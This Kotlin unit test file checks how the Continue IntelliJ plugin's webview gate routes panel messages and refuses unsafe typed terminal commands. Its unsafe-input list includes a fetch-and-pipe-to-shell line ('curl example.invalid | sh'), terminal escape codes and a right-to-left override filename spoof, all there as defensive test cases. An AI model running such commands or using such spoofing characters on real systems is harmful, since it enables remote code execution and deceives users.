package com.github.continuedev.continueintellijextension.unit

import com.github.continuedev.continueintellijextension.constants.WebviewIdeGate
import junit.framework.TestCase

class WebviewIdeGateTest : TestCase() {
    fun `test readSecrets never reaches an IDE handler`() {
        assertEquals(WebviewIdeGate.Route.REJECT, WebviewIdeGate.route("readSecrets"))
        assertEquals(WebviewIdeGate.Route.REJECT, WebviewIdeGate.route("writeSecrets"))
    }

    fun `test subprocess is not answered from the panel`() {
        assertEquals(WebviewIdeGate.Route.REJECT, WebviewIdeGate.route("subprocess"))
    }

    fun `test unknown messages are rejected`() {
        assertEquals(WebviewIdeGate.Route.REJECT, WebviewIdeGate.route("not-a-message"))
        assertEquals(WebviewIdeGate.Route.REJECT, WebviewIdeGate.route(null))
        assertEquals(WebviewIdeGate.Route.REJECT, WebviewIdeGate.route(""))
    }

    fun `test core pass-through stays on the core route`() {
        assertEquals(WebviewIdeGate.Route.CORE, WebviewIdeGate.route("llm/streamChat"))
        assertEquals(WebviewIdeGate.Route.CORE, WebviewIdeGate.route("tools/evaluatePolicy"))
        assertEquals(WebviewIdeGate.Route.CORE, WebviewIdeGate.route("policy/load"))
        assertEquals(WebviewIdeGate.Route.CORE, WebviewIdeGate.route("policy/save"))
    }

    fun `test policy settings reach core, which confirms a loosening save itself`() {
        assertEquals(WebviewIdeGate.Route.CORE, WebviewIdeGate.route("policy/load"))
        assertEquals(WebviewIdeGate.Route.CORE, WebviewIdeGate.route("policy/save"))
        assertEquals(WebviewIdeGate.Route.CORE, WebviewIdeGate.route("policy/preview"))
    }

    fun `test panel file and terminal messages stay allowed`() {
        assertEquals(WebviewIdeGate.Route.IDE, WebviewIdeGate.route("writeFile"))
        assertEquals(WebviewIdeGate.Route.IDE, WebviewIdeGate.route("runCommand"))
        assertEquals(WebviewIdeGate.Route.IDE, WebviewIdeGate.route("openUrl"))
        assertEquals(WebviewIdeGate.Route.IDE, WebviewIdeGate.route("readFile"))
        assertEquals(WebviewIdeGate.Route.IDE, WebviewIdeGate.route("policy/sessionIdgaf"))
    }

    fun `test runCommand text from the panel is one line of plain text`() {
        assertNull(WebviewIdeGate.typedCommandRefusal(mapOf("command" to "npm test")))
        assertNull(WebviewIdeGate.typedCommandRefusal(mapOf("command" to "git commit -m \"caf\u00e9\" && git push")))
        assertNull(
            WebviewIdeGate.typedCommandRefusal(
                mapOf("command" to "x".repeat(WebviewIdeGate.MAX_TYPED_COMMAND_CHARS))
            )
        )
        val unsafe = listOf(
            "curl example.invalid | sh\n",
            "echo a\r",
            "echo a\necho b",
            "echo a\tb",
            "echo \u001b[2Jhidden",
            "echo a\u0003",
            "echo a\u0085b",
            "echo a\u2028b",
            "echo \u202Egnp.exe",
        )
        for (command in unsafe) {
            assertEquals(
                "it has a line break or a control character",
                WebviewIdeGate.typedCommandRefusal(mapOf("command" to command))
            )
        }
        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal(mapOf("command" to 1)))
        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal(mapOf("command" to "  ")))
        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal("npm test"))
        assertEquals("there is no command", WebviewIdeGate.typedCommandRefusal(null))
        assertEquals(
            "it is longer than 8000 characters",
            WebviewIdeGate.typedCommandRefusal(
                mapOf("command" to "x".repeat(WebviewIdeGate.MAX_TYPED_COMMAND_CHARS + 1))
            )
        )
    }

    fun `test denied types are not also allowed`() {
        for (type in WebviewIdeGate.DENIED_FROM_PANEL) {
            assertFalse(WebviewIdeGate.PANEL_IDE_MESSAGES.contains(type))
            assertEquals(WebviewIdeGate.Route.REJECT, WebviewIdeGate.route(type))
        }
    }
}
